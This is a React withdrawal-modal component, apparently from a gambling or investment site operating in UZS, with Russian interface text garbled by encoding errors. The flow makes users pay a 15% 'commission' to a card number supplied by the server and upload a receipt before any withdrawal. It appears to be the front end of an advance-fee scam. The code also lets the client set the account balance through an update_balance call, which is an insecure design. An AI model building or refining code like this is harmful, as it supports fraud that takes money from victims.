import React, { useState, useEffect } from 'react';
import { X, CreditCard, Upload, ArrowLeft } from 'lucide-react';
import './WithdrawModal.css';
import { CONFIG_API_BASE_URL } from '../config/constants';

const API_BASE_URL = CONFIG_API_BASE_URL;

const WithdrawModal = ({ isOpen, onClose }) => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [fullName, setFullName] = useState("");
  const [file, setFile] = useState(null);
  const [loading, setLoading] = useState(false);
  const [cardLoading, setCardLoading] = useState(true);
  const [userBalance, setUserBalance] = useState(0); // –î–æ–±–∞–≤–ª—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –¥–ª—è –±–∞–ª–∞–Ω—Å–∞
  const [isCommissionPending, setIsCommissionPending] = useState(false);
  const [isWithdrawPending, setIsWithdrawPending] = useState(false);
  const [pendingWithdrawAmount, setPendingWithdrawAmount] = useState(0);
  const [commissionAmount, setCommissionAmount] = useState(0);


  // –ó–∞–≥—Ä—É–∂–∞–µ–º –±–∞–ª–∞–Ω—Å –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
  useEffect(() => {
    if (isOpen) {
      fetchUserBalance();
      fetchCardNumber();
    }
  }, [isOpen]);

  useEffect(() => {
    const pendingWithdraw = localStorage.getItem("pendingWithdraw");
    if (pendingWithdraw) {
      setStep(2);
    }
  }, []);


  useEffect(() => {
    const savedWithdraw = localStorage.getItem("pendingWithdraw");
    if (savedWithdraw) {
      const parsed = JSON.parse(savedWithdraw);
      if (parsed.amount) {
        const amountNum = Number(parsed.amount);
        setAmount(amountNum);
        setCommissionAmount(amountNum * 0.15);
      }
    }
  }, []);


  const fetchCardNumber = async () => {
    try {
      setCardLoading(true);
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/api/user/card_number`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setCardNumber(data.card_number);
        setCardHolderName(data.card_holder_name);
      } else {
        //console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –Ω–æ–º–µ—Ä–∞ –∫–∞—Ä—Ç—ã');
        setCardNumber("8600 **** **** 1234"); // Fallback
        setCardHolderName("Card Holder");
      }
    } catch (error) {
      //console.error('Error fetching card number:', error);
      setCardNumber("8600 **** **** 1234"); // Fallback
      setCardHolderName("Card Holder");
    } finally {
      setCardLoading(false);
    }
  };

  const fetchUserBalance = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const response = await fetch(`${API_BASE_URL}/api/user/get_balance`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      });

      if (response.ok) {
        const data = await response.json();
        setUserBalance(data.balance);
      }
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
  };

  const handleFileChange = (e) => {
    setFile(e.target.files[0]);
  };

  if (!isOpen) return null;

  const updateBalanceOnBackend = async (userBalanceSet) => {
    try {
      const token = localStorage.getItem("access_token");
      
      /*console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ backend:', {
        amount_change: userBalanceSet.toFixed(2),
      });*/

      const response = await fetch(`${API_BASE_URL}/api/user/update_balance`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${token}`,
        },
        body: JSON.stringify({
          amount_change: userBalanceSet,
        }),
      });

      if (response.ok) {
        const data = await response.json();
        //console.log("‚úÖ –ë–∞–ª–∞–Ω—Å –æ–±–Ω–æ–≤–ª–µ–Ω –Ω–∞ backend:", data);
        
        // –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä—É–µ–º —Å –æ—Ç–≤–µ—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–∞
        if (data.balance !== undefined) {
          setUserBalance(parseFloat(data.balance));
          sessionStorage.setItem("balance", data.balance.toString());
        }
        
        return data;
      } else {
        const errorText = await response.text();
        console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞:", errorText);
        return null;
      }
    } catch (error) {
      console.error("üö® –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞:", error);
      return null;
    }
  };

  const handleStep1Submit = (e) => {
    e.preventDefault();

    const withdrawAmount = parseFloat(amount);
    //const totalAmount = withdrawAmount + (withdrawAmount * 0.15); // –°—É–º–º–∞ + –∫–æ–º–∏—Å—Å–∏—è
    const totalAmount = withdrawAmount;
    const newUserBalance = userBalance - withdrawAmount;
    
    // –ü—Ä–æ–≤–µ—Ä–∫–∏
    if (withdrawAmount < 12000000) {
      alert('–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 12,000,000 UZS');
      return;
    }

    if (totalAmount > userBalance) {
      alert(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ!\n\n–ó–∞–ø—Ä–æ—à–µ–Ω–æ: ${withdrawAmount.toLocaleString()} UZS\n–ö–æ–º–∏—Å—Å–∏—è: ${(withdrawAmount * 0.15).toLocaleString()} UZS\n–ò—Ç–æ–≥–æ: ${totalAmount.toLocaleString()} UZS\n–í–∞—à –±–∞–ª–∞–Ω—Å: ${userBalance.toLocaleString()} UZS`);
      return;
    }

    const updatedAmountToWithdraw = userBalance; // –í—Å—è —Å—É–º–º–∞ –±–∞–ª–∞–Ω—Å–∞

    updateBalanceOnBackend(newUserBalance);
    setIsWithdrawPending(true);
    setPendingWithdrawAmount(updatedAmountToWithdraw);
    
    localStorage.setItem("pendingWithdraw", JSON.stringify({
      amount: updatedAmountToWithdraw,
      cardNumber: cardNumber,
      fullName: fullName
    }));

    //console.log(`üí∞ –°–ø–∏—Å–∞–Ω–æ ${updatedAmountToWithdraw.toLocaleString()} UZS –¥–ª—è –≤—ã–≤–æ–¥–∞`);

    setStep(2);
  };

  const handleStep2Submit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const token = localStorage.getItem('access_token');
      const formData = new FormData();
      
      formData.append('amount', amount); 
      formData.append('card_number', cardNumber);
      formData.append('full_name', fullName);

      
      
      // –î–æ–±–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å
      if (file) {
        formData.append('invoice_file', file);
      }

      // API –∑–∞–ø—Ä–æ—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤
      const response = await fetch(`${API_BASE_URL}/api/user/send_withdraw_to_tg`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData
      });

      const data = await response.json();

      if (response.ok) {
        alert('–ó–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã–≤–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –°—Ä–µ–¥—Å—Ç–≤–∞ –ø–æ—Å—Ç—É–ø—è—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 30 –º–∏–Ω—É—Ç.');
        // üîπ –ù–ï –ó–ê–ö–†–´–í–ê–ï–ú –ú–û–î–ê–õ–ö–£, –æ—Å—Ç–∞–≤–ª—è–µ–º –æ–∫–Ω–æ –∫–æ–º–∏—Å—Å–∏–∏ –æ—Ç–∫—Ä—ã—Ç—ã–º
        onClose(); // üîπ –£–ë–ò–†–ê–ï–ú —ç—Ç—É —Å—Ç—Ä–æ–∫—É
        
        // –°–±—Ä–æ—Å —Ç–æ–ª—å–∫–æ —á–∞—Å—Ç–∏ —Ñ–æ—Ä–º—ã
        // –°–±—Ä–æ—Å —Ñ–æ—Ä–º—ã
        setStep(1);
        setAmount("");
        setCardNumber("");
        setFullName("");
        setFile(null);

        // üîπ –ñ–î–ï–ú –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ò–Ø –û–ü–õ–ê–¢–´ –û–¢ –ê–î–ú–ò–ù–ê
        // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ–ø—Ä–æ—Å —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ —Å—Ç–∞—Ç—É—Å –æ–ø–ª–∞—Ç—ã
      } else {
        alert(data.message || '–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –≤—ã–≤–æ–¥–∞');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º');
    } finally {
      setLoading(false);
    }
  };

  const safeAmount = Number(amount) || 0;
  // –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –∫–æ–º–∏—Å—Å–∏—é 15% –æ—Ç —Å—É–º–º—ã –≤—ã–≤–æ–¥–∞
  const commissionPercentage = 15;
  const safeCommission = Math.round(safeAmount * (commissionPercentage / 100));
  const totalAmount = safeAmount + safeCommission; // –û–±—â–∞—è —Å—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é (–≤—ã–≤–æ–¥ + –∫–æ–º–∏—Å—Å–∏—è)
      
  return (
    <div className="withdraw-modal-overlay" onClick={onClose}>
      <div className="withdraw-modal-content" onClick={(e) => e.stopPropagation()}>
        <div className="withdraw-modal-header">
          {/*{step === 2 && (
            <button className="back-button" onClick={() => setStep(1)}>
              <ArrowLeft size={20} />
            </button>
          )}*/}
          <h2 className="withdraw-modal-title">
            <CreditCard className="withdraw-modal-icon" />
            {step === 1 ? '–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤' : '–û–ø–ª–∞—Ç–∞ –∫–æ–º–∏—Å—Å–∏–∏'}
          </h2>
          <button onClick={onClose} className="close-button">
            <X size={20} />
          </button>
        </div>

        {step === 1 ? (
          <form onSubmit={handleStep1Submit} className="withdraw-form">
            <div className="balance-info">
              üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å: <strong>{userBalance.toLocaleString()} UZS</strong>
            </div>

            <div className="min-amount-info">
              üí∏ –í—ã–≤–æ–¥ –æ—Ç <strong>12,000,000 UZS</strong>
            </div>

            <div className="form-group">
              <label className="form-label">–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ (UZS)</label>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –æ—Ç 12,000,000"
                className="form-input"
                min="12000000"
                step="1000"
                required
              />
            </div>

            {/* –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ä–∞—Å—á–µ—Ç–∞—Ö */}
            {amount && parseFloat(amount) >= 12000000 && (
              <div className="calculation-preview">
                <div className="calculation-row">
                  <span>–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞:</span>
                  <span>{parseFloat(amount).toLocaleString()} UZS</span>
                </div>
                {/*<div className="calculation-row">
                  <span>–ö–æ–º–∏—Å—Å–∏—è (15%):</span>
                  <span>{commissionAmount.toLocaleString()} UZS</span>
                </div>*/}
                <div className="calculation-row total">
                  <span>–ò—Ç–æ–≥–æ –∫ —Å–ø–∏—Å–∞–Ω–∏—é:</span>
                  <span>{safeAmount.toLocaleString()} UZS</span>
                </div>
                <div className={`balance-check ${totalAmount <= userBalance ? 'sufficient' : 'insufficient'}`}>
                  {totalAmount <= userBalance ? '‚úÖ –î–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤' : '‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤'}
                </div>
              </div>
            )}

            <div className="form-group">
              <label className="form-label">–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                placeholder="0000 0000 0000 0000"
                className="form-input"
                required
              />
            </div>

            <div className="form-group">
              <label className="form-label">–ò–º—è –∏ —Ñ–∞–º–∏–ª–∏—è</label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                placeholder="–í–≤–µ–¥–∏—Ç–µ –∏–º—è –∏ —Ñ–∞–º–∏–ª–∏—é –∫–∞–∫ –Ω–∞ –∫–∞—Ä—Ç–µ"
                className="form-input"
                required
              />
            </div>

            <button 
              type="submit" 
              className="submit-button primary"
              disabled={amount && totalAmount > userBalance}
            >
              –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
            </button>
          </form>
        ) : (
          <form onSubmit={handleStep2Submit} className="commission-form">
            {/*<div className="commission-info">
              <p>–û–ø–ª–∞—Ç–∏—Ç–µ <strong>15% –æ—Ç —Å—É–º–º—ã –≤—ã–≤–æ–¥–∞</strong>, –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ —Å—Ä–µ–¥—Å—Ç–≤–∞ –ø–æ—Å—Ç—É–ø—è—Ç –Ω–∞ –≤–∞—à –±–∞–Ω–∫–æ–≤—Å–∫–∏–π —Å—á–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 30 –º–∏–Ω—É—Ç</p>
            </div>*/}

            <div className="calculation-section">
              <div className="calculation-row">
                <span>–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞:</span>
                <span>{safeAmount.toLocaleString()} UZS</span>
              </div>
              <div className="calculation-row">
                <span>–ö–æ–º–∏—Å—Å–∏—è (15%):</span>
                <span>{safeCommission.toLocaleString()} UZS</span>
              </div>
              <div className="calculation-row total">
                <span>–ö –æ–ø–ª–∞—Ç–µ –∫–æ–º–∏—Å—Å–∏–∏:</span>
                <span>{safeCommission.toLocaleString()} UZS</span>
              </div>
            </div>


            <div className="payment-details">
              <p className="details-label">–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã –∫–æ–º–∏—Å—Å–∏–∏:</p>
              <div className="card-number">
                üí≥ –ö–∞—Ä—Ç–∞: {cardLoading ? "–ó–∞–≥—Ä—É–∑–∫–∞..." : cardNumber}
              </div>
              <div className="card-holder">
                üë§ –í–ª–∞–¥–µ–ª–µ—Ü: {cardLoading ? "–ó–∞–≥—Ä—É–∑–∫–∞..." : cardHolderName}
              </div>
            </div>

            <div className="file-section">
              <p className="file-warning">
                ‚ö†Ô∏è –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –∫–æ–º–∏—Å—Å–∏–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫–≤–∏—Ç–∞–Ω—Ü–∏—é (—á–µ–∫) –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û
              </p>
              <label className="file-upload">
                <Upload className="upload-icon" />
                <span>{file ? file.name : "–ü—Ä–∏–∫—Ä–µ–ø–∏—Ç—å –∫–≤–∏—Ç–∞–Ω—Ü–∏—é –æ–± –æ–ø–ª–∞—Ç–µ –∫–æ–º–∏—Å—Å–∏–∏"}</span>
                <input 
                  type="file" 
                  onChange={handleFileChange}
                  accept="image/*,.pdf"
                  className="file-input"
                  required
                />
              </label>
            </div>

            <button type="submit" className="submit-button primary" disabled={loading}>
              {loading ? '–û—Ç–ø—Ä–∞–≤–∫–∞...' : '–û–ø–ª–∞—Ç–∏—Ç—å –∫–æ–º–∏—Å—Å–∏—é –∏ –≤—ã–≤–µ—Å—Ç–∏'}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default WithdrawModal;